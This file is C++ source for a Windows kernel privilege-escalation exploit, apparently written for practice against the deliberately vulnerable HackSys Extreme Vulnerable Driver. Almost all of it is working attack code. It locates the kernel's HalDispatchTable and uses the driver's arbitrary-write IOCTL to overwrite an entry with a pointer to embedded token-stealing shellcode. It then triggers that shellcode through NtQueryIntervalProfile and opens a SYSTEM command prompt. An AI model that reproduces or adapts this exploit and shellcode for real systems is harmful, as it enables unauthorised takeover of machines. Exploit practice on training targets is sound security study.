#include <iostream>
#include <windows.h>
#include <psapi.h>

// QWORD is nicer!
typedef uint64_t QWORD;
typedef QWORD* PQWORD;

// 
// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/d4drvif/nf-d4drvif-ctl_code
#define HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)

#define HEVD_SYM_LINK "\\\\.\\HacksysExtremeVulnerableDriver"
#define NTOSKRNL_EXE  "c:\\\\windows\\system32\\ntoskrnl.exe"

#define ARRAY_SIZE 1024

// this is defined in the driver
typedef struct _WRITE_WHAT_WHERE
{
    PQWORD What;
    PQWORD Where;
} WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE, ArbitraryWrite;

// the userland call
typedef NTSTATUS(__stdcall* _NtQueryIntervalProfile)(DWORD ProfileSource, PULONG Interval);

QWORD GetKernelBase()
{
    LPVOID drivers[ARRAY_SIZE];
    DWORD cbNeeded;
    EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);

    return (QWORD)drivers[0];
}

int main()
{
    // get a handle to the driver using the Symbolic link
    HANDLE hDevice = CreateFileA(HEVD_SYM_LINK, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);

    printf("[+] HEVD Arbitrary Overwrite\n");
    printf("[+] ------------------------\n\n");

    // get the kernel base address
    QWORD kernelBase = GetKernelBase();
    printf("[+] Kernel base: 0x%p\n", (QWORD)kernelBase);

    // Load kernel in to user land and get the HalDispatchTable address
    HMODULE hKernel = LoadLibraryA(NTOSKRNL_EXE);
    HANDLE hHal = GetProcAddress(hKernel, "HalDispatchTable");
    QWORD halOffset = (QWORD)hHal - (QWORD)hKernel;
    printf("[+] HalDispatchTable offset: 0x%p\n", (QWORD)halOffset);
    
    QWORD halAddress = (QWORD)kernelBase + (QWORD)halOffset;
    printf("[+] HalDispatchTable address: 0x%p\n", (QWORD)halAddress);

    // if CreateFileA fails the handle will be -0x1
    if (hDevice == (HANDLE)-0x1)
    {
        printf("[+] Driver handle: 0x%p\n", hDevice);
        printf("[!] Unable to get a handle to the driver.\n");
        return 1;
    }
    else
    {
        printf("[+] Driver handle: 0x%p\n", hDevice);

        // token stealing shellcode - 64bit
        const unsigned char shellcode[] = {
            0x50, 0x53, 0x51, 0x56, 0x57, 0x48, 0x31, 0xC0,
            0x65, 0x48, 0x8B, 0x80, 0x88, 0x01, 0x00, 0x00,
            0x48, 0x8B, 0x40, 0x70, 0x49, 0x89, 0xC0, 0x41,
            0xB9, 0x04, 0x00, 0x00, 0x00, 0x4D, 0x8B, 0x80,
            0x88, 0x01, 0x00, 0x00, 0x49, 0x81, 0xE8, 0x88,
            0x01, 0x00, 0x00, 0x4D, 0x39, 0x88, 0x80, 0x01,
            0x00, 0x00, 0x75, 0xE9, 0x49, 0x8B, 0x88, 0x08,
            0x02, 0x00, 0x00, 0x80, 0xE1, 0xF0, 0x48, 0x89,
            0x88, 0x08, 0x02, 0x00, 0x00, 0x5F, 0x5E, 0x59,
            0x5B, 0x58, 0xC3
        };

        // allocate memory for the shellcode
        LPVOID allocShellcode = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!allocShellcode)
        {
            printf("[!] Unable to allocate memory for the shellcode. Error code: %d\n", GetLastError());
            return 1;
        }

        printf("[+] Memory allocated for shellcode: 0x%p\n", allocShellcode);

        // copy the shellcode in to the memory
        RtlMoveMemory(allocShellcode, shellcode, sizeof(shellcode));
        printf("[+] Shellcode copied to: 0x%p\n", allocShellcode);
        
        WRITE_WHAT_WHERE ArbitraryWrite = { 0 };
        ArbitraryWrite.What =  (PQWORD)&allocShellcode;
        ArbitraryWrite.Where = (PQWORD)halAddress + 0x1;

        printf("[+] Will overwrite 0x%p with 0x%p...\n", ArbitraryWrite.Where, &allocShellcode);

        printf("[!] Press enter when ready...");
        getchar();

        printf("[+] Sending buffer to IOCTL: 0x%p...\n", HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE);

        // not sure why but without the __try __except the exploit crashes
        __try
        {
            // interact with the driver
            DeviceIoControl(hDevice, HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE, (LPVOID)&ArbitraryWrite, sizeof(ArbitraryWrite), NULL, 0, NULL, NULL);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            
        }

        // make the userland call to trigger our shellcode
        ULONG dummy = 0;
        _NtQueryIntervalProfile NtQueryIntervalProfile;
        NtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryIntervalProfile");
        NtQueryIntervalProfile(0x1337, &dummy);

        printf("[+] Hopefully the magic has happened...\n");
        printf("[+] Spawning new process..\n\n");
        

        // spawn a new command prompt
        system("cmd.exe");

        // close the driver handle
        CloseHandle(hDevice);
    }
}
